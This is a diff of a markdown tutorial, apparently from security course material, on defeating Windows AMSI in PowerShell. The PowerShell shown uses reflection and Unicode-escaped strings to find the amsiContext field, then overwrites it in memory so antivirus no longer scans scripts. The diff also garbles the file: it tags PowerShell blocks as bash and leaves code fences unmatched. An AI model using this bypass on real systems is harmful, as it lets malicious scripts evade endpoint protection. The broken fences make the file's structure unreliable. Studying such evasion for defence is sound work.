@@ -92,13 +92,12 @@ Locate amsiContext
 • Test this hypothesis
 • Use Unicode characters using built-in PowerShell functionality
 
-```
+```bash
 PS C:\> [Ref].Assembly.GetType('System.Management.Aut
 omation.'+[regex]::Unescape('\u0041')+'msiUtils').Get
 Field("ams"+[regex]::Unescape('\u0069')+"Context",
 'NonPublic,Static').GetValue($null)
-```
-
+```bash
 AMSI Under the Hood
 Now that we have the memory location of the amsiContext field, we can take a look through a debugger's eyes to
 see what that field looks like in memory.
@@ -142,9 +141,8 @@ egex]::Unescape('\u0041')+'msiUtils')
 echo $ptr
 # copy the array to the memory location
 [System.Runtime.InteropServices.Marshal]::Copy($sec565,0,$ptr,$length)
-```
-
-```
+```bash
+```bash
 AMSI Bypass Code
 We create the byte array, and will find the length for our call to copy later on.
 Once we get the memory address, we print it to standard out.
@@ -163,8 +161,7 @@ tValue($null)
 echo $ptr
 # copy the array to the memory location
 [System.Runtime.InteropServices.Marshal]::Copy($sec565,0,$ptr,$length)
-```
-
+```bash
 # AMSI Bypass in Action
 
 Let's restart PowerShell and apply the patch, then inspect what it
@@ -179,8 +176,7 @@ This script contains malicious content and has been blocked by your antivirus so
 + CategoryInfo
 : ParserError: (:) [], ParentContainsErrorRecordException
 + FullyQualifiedErrorId : ScriptContainedMaliciousContent
-```
-
+```bash
 If we now restart PowerShell and apply the patch and attach WinDbg again, we will see our "sec565 rules!!!"
 sentence where 'AMSI' used to be in the amsiContext field. By replacing the AMSI string with our own custom
 string, we effectively broke AMSI's functionality, which allows us to do whatever we want without having to
